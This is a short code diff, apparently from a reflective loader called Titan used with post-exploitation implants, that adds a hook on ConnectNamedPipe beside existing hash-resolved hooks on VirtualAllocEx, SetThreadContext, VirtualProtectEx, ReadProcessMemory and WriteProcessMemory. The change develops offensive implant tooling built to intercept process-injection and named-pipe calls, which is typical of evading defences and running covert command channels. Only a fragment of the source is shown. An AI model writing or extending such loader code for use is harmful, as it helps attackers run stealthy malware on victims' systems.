@@ -111,6 +111,7 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5775bd54, PTR_TO_HOOK( Mem, VirtualAllocEx_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfd1438ae, PTR_TO_HOOK( Mem, SetThreadContext_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5b6b908a, PTR_TO_HOOK( Mem, VirtualProtectEx_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5c3f8699, PTR_TO_HOOK( Mem, ReadProcessMemory_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xb7930ae8, PTR_TO_HOOK( Mem, WriteProcessMemory_Hook ) );
 		};
